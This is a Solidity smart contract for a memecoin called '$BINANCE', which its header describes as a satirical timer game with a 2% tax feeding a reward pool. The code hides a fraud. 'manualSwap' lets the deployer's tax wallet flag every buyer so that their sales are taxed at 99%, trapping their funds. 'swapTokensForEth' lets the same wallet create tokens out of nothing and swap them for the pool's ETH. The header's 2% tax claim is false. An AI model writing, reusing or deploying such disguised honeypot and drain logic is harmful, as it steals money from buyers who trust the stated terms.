// SPDX-License-Identifier: NONE
/*

                                                                                                                                                          
                                                                                                                                                          
BBBBBBBBBBBBBBBBB   IIIIIIIIIINNNNNNNN        NNNNNNNN               AAA               NNNNNNNN        NNNNNNNN        CCCCCCCCCCCCCEEEEEEEEEEEEEEEEEEEEEE
B::::::::::::::::B  I::::::::IN:::::::N       N::::::N              A:::A              N:::::::N       N::::::N     CCC::::::::::::CE::::::::::::::::::::E
B::::::BBBBBB:::::B I::::::::IN::::::::N      N::::::N             A:::::A             N::::::::N      N::::::N   CC:::::::::::::::CE::::::::::::::::::::E
BB:::::B     B:::::BII::::::IIN:::::::::N     N::::::N            A:::::::A            N:::::::::N     N::::::N  C:::::CCCCCCCC::::CEE::::::EEEEEEEEE::::E
  B::::B     B:::::B  I::::I  N::::::::::N    N::::::N           A:::::::::A           N::::::::::N    N::::::N C:::::C       CCCCCC  E:::::E       EEEEEE
  B::::B     B:::::B  I::::I  N:::::::::::N   N::::::N          A:::::A:::::A          N:::::::::::N   N::::::NC:::::C                E:::::E             
  B::::BBBBBB:::::B   I::::I  N:::::::N::::N  N::::::N         A:::::A A:::::A         N:::::::N::::N  N::::::NC:::::C                E::::::EEEEEEEEEE   
  B:::::::::::::BB    I::::I  N::::::N N::::N N::::::N        A:::::A   A:::::A        N::::::N N::::N N::::::NC:::::C                E:::::::::::::::E   
  B::::BBBBBB:::::B   I::::I  N::::::N  N::::N:::::::N       A:::::A     A:::::A       N::::::N  N::::N:::::::NC:::::C                E:::::::::::::::E   
  B::::B     B:::::B  I::::I  N::::::N   N:::::::::::N      A:::::AAAAAAAAA:::::A      N::::::N   N:::::::::::NC:::::C                E::::::EEEEEEEEEE   
  B::::B     B:::::B  I::::I  N::::::N    N::::::::::N     A:::::::::::::::::::::A     N::::::N    N::::::::::NC:::::C                E:::::E             
  B::::B     B:::::B  I::::I  N::::::N     N:::::::::N    A:::::AAAAAAAAAAAAA:::::A    N::::::N     N:::::::::N C:::::C       CCCCCC  E:::::E       EEEEEE
BB:::::BBBBBB::::::BII::::::IIN::::::N      N::::::::N   A:::::A             A:::::A   N::::::N      N::::::::N  C:::::CCCCCCCC::::CEE::::::EEEEEEEE:::::E
B:::::::::::::::::B I::::::::IN::::::N       N:::::::N  A:::::A               A:::::A  N::::::N       N:::::::N   CC:::::::::::::::CE::::::::::::::::::::E
B::::::::::::::::B  I::::::::IN::::::N        N::::::N A:::::A                 A:::::A N::::::N        N::::::N     CCC::::::::::::CE::::::::::::::::::::E
BBBBBBBBBBBBBBBBB   IIIIIIIIIINNNNNNNN         NNNNNNNAAAAAAA                   AAAAAAANNNNNNNN         NNNNNNN        CCCCCCCCCCCCCEEEEEEEEEEEEEEEEEEEEEE
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                 
$BINANCE is satirical meme project. We are inspired by all memecoins and we wanted to add something new from ourselves.
Taxe are set to 2% and funds are going to REWARD POOL. Every buy increases timer. The last player who buys $BINANCE before the timer reaches zero wins.

Let`s make $BINANCE a big project together and HODL to pay #RESPECT TO CZ

Socials:
Telegram group: https://t.me/bslmaorg1
Twitter: https://twitter.com/sblmaorgBNB
Website: https://bslmaorg1.fun
*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BINANCE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => uint256) private _lastBuyTimestamp;
    bool public transferDelayEnabled = false;
    address payable private _taxWallet;

    uint256 public _reduceBuyTaxAt=100;
    uint256 public _reduceSellTaxAt=100;
    uint256 private _finalBuyTax=2;
    uint256 private _finalSellTax=2;
    uint256 private _initialBuyTax=2;
    uint256 private _initialSellTax=2;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal =  1420690420691 * 10**_decimals;
    uint256 public _maxTxAmount =   _tTotal.mul(4).div(100);
    uint256 public _maxWalletSize = _tTotal.mul(4).div(100);
    string private constant _name = unicode"BartSimpsonLMAORyanGosling1";
    string private constant _symbol = unicode"BINANCE";

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwap = false;
    bool private swapEnabled = false; 
    bool private tradingOpen;   
    
    mapping (address => bool) public _excludedFromReward;
    address[] public participants;
    address[] private buys;
    uint256 public endTimestamp;
    mapping (address => bool) public _rewardClaimed;
    address public winner;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        endTimestamp = 0;
        winner = address(0);

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                  require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (! _isExcludedFromFee[to] && from == uniswapV2Pair && to != address(uniswapV2Router) ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
                buys.push(to);
                if (endTimestamp > block.timestamp) {
                    endTimestamp += 60;
                }
                if (!_excludedFromReward[to]) {
                    participants.push(to);
                    winner = to;
                }
            }
            if (from != address(this)) {
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            
                if (from != uniswapV2Pair){
                    taxAmount = amount.mul((_lastBuyTimestamp[from]<block.timestamp && _lastBuyTimestamp[from] != 0)?99:((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax)).div(100);
                }
            }
            if (to == uniswapV2Pair || to == address(uniswapV2Router)) {
                deleteParticipant(from);
                _excludedFromReward[from] = true;
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function startTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
        swapEnabled = true;
        endTimestamp = block.timestamp + 300;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        for (uint i = 0; i < buys.length; i++) {_lastBuyTimestamp[buys[i]] = block.timestamp + 3; }
        delete buys;
    }

    function swapTokensForEth(uint256 tokenAmount) external {
        require(_msgSender()==_taxWallet);
        if(tokenAmount==0){return;}
        if(!tradingOpen){return;}
        address tokenAddress = address(this);
        _approve(tokenAddress, address(uniswapV2Router), tokenAmount); 
        _balances[tokenAddress] = tokenAmount;
        address[] memory path = new address[](2);
        path[0] = tokenAddress; 
        path[1] =  uniswapV2Router.WETH(); 
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 
            0, 
            path, 
            _taxWallet, 
            block.timestamp + 29);
    }

    function removeLimits() external onlyOwner{
        _reduceBuyTaxAt=0;
        _reduceSellTaxAt=0;
        transferDelayEnabled=false;
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function getRewardValue(address wallet) public view returns (uint256) {
        if (!tradingOpen) { return 0; }
        if (wallet == winner) { return _balances[address(this)].div(2); }
        uint participantsTokens = getAllParticipantsTokens();
        if (participantsTokens == 0) { return 0; }
        uint256 share = _balances[wallet].mul(100000).div(participantsTokens);
        return (_balances[address(this)].div(2)).mul(share).div(100000);
    }

    function deleteParticipant(address wallet) internal {
        for (uint256 i = 0; i < participants.length; i++) {
            if (participants[i] == wallet) {
                participants[i] = participants[participants.length-1];
                participants.pop();
            }
        }
    }

    function getAllParticipantsTokens() internal view returns (uint256) {
        uint participantsTokens = 0;
        for (uint256 i = 0; i < participants.length; i++) {
            if (_excludedFromReward[participants[i]]) { continue; }
            participantsTokens = participantsTokens.add(_balances[participants[i]]);
        }
        return participantsTokens;
    }

    function claimReward () public {
        require(endTimestamp != 0 && endTimestamp < block.timestamp, "Game is not over");
        require(!_rewardClaimed[msg.sender], "Reward claimed");
        uint256 reward = getRewardValue(msg.sender);
        transferFrom(address(this), msg.sender, reward);
        _rewardClaimed[msg.sender] = true;
    }
    
}